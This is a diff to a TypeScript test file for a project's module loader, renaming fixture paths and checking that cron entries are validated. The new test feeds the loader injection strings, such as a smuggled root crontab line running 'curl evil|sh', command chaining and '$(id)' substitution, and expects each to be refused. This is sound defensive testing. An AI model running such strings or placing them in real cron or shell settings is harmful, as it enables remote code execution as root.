@@ -1,6 +1,10 @@
 import { describe, expect, test } from "bun:test";
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 
 import { brainConfigSchema, type BrainConfig } from "../src/lib/config";
+import { loadModules } from "../src/lib/module-loader";
 import type { LoadedModule } from "../src/lib/module-types";
 import { buildTaxonomy } from "../src/lib/taxonomy";
 
@@ -130,7 +134,7 @@ describe("reference brain shape (modules + user config)", () => {
         },
       ],
     });
-    expect(withJobs.typeForPath("career/opportunities/acme/status.md")).toBe("opportunity");
+    expect(withJobs.typeForPath("career/opportunities/scheria/status.md")).toBe("opportunity");
     expect(withJobs.typeForPath("career/cv.md")).toBe("career");
   });
 
@@ -155,7 +159,7 @@ describe("reference brain shape (modules + user config)", () => {
     // Prefix rules match the containing dir: nested files match "career/",
     // a direct child of career/ falls through to the generic dir label
     // (verbatim historical deriveAssetTitle semantics).
-    expect(tax.assetTitleFor("career/applications/acme/jd.pdf")).toBe("CV: jd");
+    expect(tax.assetTitleFor("career/applications/scheria/jd.pdf")).toBe("CV: jd");
     expect(tax.assetTitleFor("career/cv-2026.pdf")).toBe("career: cv-2026");
     expect(tax.assetTitleFor("notes/scans/receipt.pdf")).toBe("scans: receipt");
   });
@@ -414,23 +418,41 @@ describe("modules key containment", () => {
 
 describe("module cron field constraints", () => {
   // The loader's contribution schema is not exported; exercise it through a
-  // local module fixture the loader actually imports.
-  test("regex shapes accept real entries and reject injection", () => {
-    const name = /^[a-z0-9][a-z0-9-]{0,63}$/;
-    const schedule = /^[-0-9*,/ ]{1,100}$/;
-    const command = /^[A-Za-z0-9 _.:=@,\-/]{1,200}$/;
+  // local module fixture the loader actually imports. The fixture returns
+  // whatever cron entries its config block hands it, so one module file
+  // serves every case.
+  async function loadCron(cron: unknown[]) {
+    const root = mkdtempSync(join(tmpdir(), "brain-taxonomy-cron-"));
+    try {
+      mkdirSync(join(root, "modules", "watchtower"), { recursive: true });
+      writeFileSync(
+        join(root, "modules", "watchtower", "module.ts"),
+        'export default { name: "watchtower", setup: (config) => ({ cron: config.cron }) };\n'
+      );
+      const loaded = await loadModules(brainConfigSchema.parse({ modules: { "./modules/watchtower": { cron } } }), root);
+      return loaded[0]!.manifest.cron;
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  }
+  const entry = { name: "scrape", schedule: "0 6 * * *", command: "jobs scrape --all" };
 
-    expect(name.test("scrape")).toBe(true);
-    expect(schedule.test("0 6 * * *")).toBe(true);
-    expect(command.test("jobs scrape --all")).toBe(true);
+  test("regex shapes accept real entries and reject injection", async () => {
+    expect(await loadCron([entry])).toEqual([entry]);
 
     // Newline injection into a root crontab line, and shell metacharacters.
-    expect(schedule.test("0 6 * * *\n0 0 * * * root curl evil|sh")).toBe(false);
-    expect(command.test("jobs scrape\n0 0 * * * root sh -c evil")).toBe(false);
-    expect(command.test("jobs scrape; curl evil | sh")).toBe(false);
-    expect(command.test("jobs scrape $(id)")).toBe(false);
-    expect(command.test("jobs scrape `id`")).toBe(false);
-    expect(name.test("scrape\nroot")).toBe(false);
+    const refused: [Partial<typeof entry>, string][] = [
+      [{ schedule: "0 6 * * *\n0 0 * * * root curl evil|sh" }, "cron schedule must be a 5-field expression"],
+      [{ command: "jobs scrape\n0 0 * * * root sh -c evil" }, "cron command must be a plain"],
+      [{ command: "jobs scrape; curl evil | sh" }, "cron command must be a plain"],
+      [{ command: "jobs scrape $(id)" }, "cron command must be a plain"],
+      [{ command: "jobs scrape `id`" }, "cron command must be a plain"],
+      [{ name: "scrape\nroot" }, "cron name must be kebab-case"],
+    ];
+    for (const [field, message] of refused) {
+      const failure = await loadCron([{ ...entry, ...field }]).then(() => null, (error: Error) => error.message);
+      expect(failure).toContain(message);
+    }
   });
 });
 
